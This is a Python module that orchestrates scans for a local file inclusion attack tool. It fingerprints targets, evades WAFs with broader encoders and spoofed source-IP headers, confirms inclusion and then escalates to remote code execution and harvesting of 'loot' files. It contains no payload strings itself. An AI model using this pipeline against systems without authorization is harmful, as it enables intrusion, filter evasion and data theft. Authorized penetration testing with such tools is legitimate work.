"""
Scan orchestration.

The engine ties everything together:

1. Fingerprint the target once and auto-analyse its response headers.
2. Adapt strategy to what the headers reveal (e.g. a WAF -> tougher encoders and
   source-IP spoofing headers).
3. For each injection point, build a behavioural baseline.
4. Run detection techniques (traversal, wrappers, header injection) to confirm
   inclusion — the payload sweep for a point runs concurrently across the worker
   pool so a single URL is fast.
5. If confirmed and escalation is enabled, run RCE and harvesting techniques,
   reusing the exact working traversal/encoder discovered during detection.

A live progress reporter shows what is being tried in real time.
"""
from __future__ import annotations

import secrets
from dataclasses import dataclass, field
from typing import Dict, List, Optional

from lfimachine.core import baseline as baseline_mod
from lfimachine.core import fingerprint as fp_mod
from lfimachine.core import headers as headers_mod
from lfimachine.core.http import HttpClient
from lfimachine.core.result import Finding, Severity
from lfimachine.core.target import InjectionPoint, Target
from lfimachine.payloads import encoders as enc
from lfimachine.techniques.base import Technique, TechniqueContext
from lfimachine.techniques.harvest import HarvestTechnique
from lfimachine.techniques.header_lfi import HeaderLfiTechnique
from lfimachine.techniques.log_poison import LogPoisonTechnique, ProcEnvironTechnique
from lfimachine.techniques.traversal import TraversalTechnique
from lfimachine.techniques.wrappers import WrapperRceTechnique, WrapperSourceTechnique
from lfimachine.utils.logger import Logger
from lfimachine.utils.progress import Progress


@dataclass
class ScanConfig:
    encoders: List[str] = field(default_factory=list)
    min_depth: int = 1
    max_depth: int = 12
    aggressive: bool = False
    rce: bool = False
    threads: int = 8
    stop_on_first: bool = True
    max_attempts: int = 0           # per-probe request cap (0 = auto)
    test_params: Optional[List[str]] = None
    include_cookies: bool = False
    include_headers: List[str] = field(default_factory=list)
    loot_dir: Optional[str] = None
    harvest: bool = False
    auto_headers: bool = False
    adapt: bool = True              # adapt to headers (WAF -> tougher payloads)
    progress: bool = True


@dataclass
class ScanReport:
    target: str
    fingerprint: Optional[fp_mod.Fingerprint] = None
    header_insights: Optional[headers_mod.HeaderInsights] = None
    findings: List[Finding] = field(default_factory=list)
    points_tested: int = 0
    requests_sent: int = 0
    vulnerable: bool = False


class Engine:
    def __init__(self, client: HttpClient, config: ScanConfig, logger: Logger) -> None:
        self.client = client
        self.config = config
        self.log = logger

    def _build_techniques(self) -> List[Technique]:
        techs: List[Technique] = [
            TraversalTechnique(),
            HeaderLfiTechnique(),
            WrapperSourceTechnique(),
            WrapperRceTechnique(),
            LogPoisonTechnique(),
            ProcEnvironTechnique(),
        ]
        if self.config.harvest:
            techs.append(HarvestTechnique(loot_dir=self.config.loot_dir))
        techs.sort(key=lambda t: t.priority, reverse=True)
        return techs

    def scan(self, target: Target) -> ScanReport:
        report = ScanReport(target=target.url)
        points = target.injection_points(
            test_params=self.config.test_params,
            include_cookies=self.config.include_cookies,
            include_headers=self.config.include_headers,
        )
        if not points:
            self.log.warn(
                "No injection points found. Provide a parameter, a FUZZ marker "
                "in the URL, or POST data to test."
            )
            return report

        report.points_tested = len(points)

        progress = Progress(
            enabled=self.config.progress,
            count_fn=lambda: self.client.request_count,
        )
        self.log.attach_sink(progress.write_line if progress.enabled else None)
        progress.activity("fingerprinting")
        progress.start()

        try:
            self.log.info(f"Testing {len(points)} injection point(s) on {target.url}")

            # Fingerprint + header analysis using the first point.
            report.fingerprint = fp_mod.run(self.client, points[0], target.url)
            self.log.info(f"Fingerprint: {report.fingerprint.summary()} "
                          f"(confidence {report.fingerprint.confidence:.2f})")

            insights, spoof = self._analyse_and_adapt(points[0], report)
            report.header_insights = insights

            all_findings: List[Finding] = self._header_findings(insights, target.url)

            for pt in points:
                all_findings.extend(
                    self._scan_point(pt, report.fingerprint, progress, spoof)
                )
        finally:
            progress.stop()
            self.log.attach_sink(None)

        # De-duplicate identical findings (same technique/param/title).
        seen = set()
        unique: List[Finding] = []
        for f in sorted(all_findings, key=lambda x: x.sort_key, reverse=True):
            key = (f.technique, f.parameter, f.title)
            if key in seen:
                continue
            seen.add(key)
            unique.append(f)

        report.findings = unique
        report.vulnerable = any(
            f.confidence >= 0.5 and f.severity.rank >= Severity.MEDIUM.rank
            for f in unique
        )
        report.requests_sent = self.client.request_count
        return report

    def _analyse_and_adapt(self, point: InjectionPoint, report: ScanReport):
        """Inspect response headers and derive adaptation signals."""
        probe = point.send(self.client, "index")
        insights = headers_mod.analyze(probe.headers if probe.ok else {})
        spoof: Dict[str, str] = {}

        bits = []
        if insights.waf:
            bits.append(f"WAF/CDN: {insights.waf}")
        elif insights.cdn:
            bits.append(f"CDN: {insights.cdn}")
        if insights.server:
            bits.append(f"server: {insights.server}")
        if bits:
            self.log.info("Headers — " + ", ".join(bits))

        if self.config.adapt and insights.waf_present:
            # Broaden the ENCODER set (not the payload space) and blend in
            # source-IP headers to survive filters — without exploding request
            # volume the way full --aggressive does.
            if not self.config.encoders:
                self.config.encoders = enc.default_encoder_order(aggressive=True)
                self.log.verbose("WAF adaptation: broadened encoder set")
            spoof = insights.spoof_headers()
            for note in insights.notes:
                self.log.verbose(note)
        return insights, spoof

    def _header_findings(self, insights: headers_mod.HeaderInsights, url: str) -> List[Finding]:
        out: List[Finding] = []
        if insights.waf or insights.cdn:
            out.append(Finding(
                technique="header-analysis",
                title=f"Perimeter detected — {insights.waf or insights.cdn}",
                severity=Severity.INFO,
                confidence=0.6,
                url=url, parameter="<headers>",
                evidence=f"waf={insights.waf} cdn={insights.cdn} server={insights.server}",
                remediation="", extra={"caching": insights.caching},
            ))
        if insights.interesting:
            out.append(Finding(
                technique="header-analysis",
                title="Technology disclosure in response headers",
                severity=Severity.LOW,
                confidence=0.5,
                url=url, parameter="<headers>",
                evidence="; ".join(f"{k}: {v}" for k, v in insights.interesting.items()),
                remediation="Suppress version/technology headers.",
            ))
        return out

    def _scan_point(self, point: InjectionPoint, fingerprint, progress, spoof) -> List[Finding]:
        findings: List[Finding] = []
        marker = "LFIMK" + secrets.token_hex(3)

        # Apply source-IP spoofing headers to every request for this point.
        if spoof:
            point.base_headers = {**point.base_headers, **spoof}

        self.log.verbose(f"Building baseline for {point.describe()}")
        bl = baseline_mod.build(self.client, point, marker)

        ctx = TechniqueContext(
            client=self.client, point=point, baseline=bl, fingerprint=fingerprint,
            logger=self.log, encoders=self.config.encoders,
            min_depth=self.config.min_depth, max_depth=self.config.max_depth,
            aggressive=self.config.aggressive, rce=self.config.rce,
            stop_on_first=self.config.stop_on_first, threads=self.config.threads,
            max_attempts=self.config.max_attempts,
            auto_headers=self.config.auto_headers, spoof_headers=spoof,
            extra_test_headers=self.config.include_headers, progress=progress,
            os_confirmed=fingerprint.os,
        )

        inclusion_confirmed = False
        for tech in self._build_techniques():
            if tech.requires_inclusion and not inclusion_confirmed:
                continue
            if not tech.applicable(ctx):
                continue
            if progress:
                progress.activity(tech.name)
            try:
                for finding in tech.run(ctx):
                    findings.append(finding)
                    if tech.name in ("path-traversal", "header-injection"):
                        inclusion_confirmed = True
            except Exception as exc:  # a broken technique shouldn't kill the scan
                self.log.debug(f"technique {tech.name} raised: {exc}")
        return findings
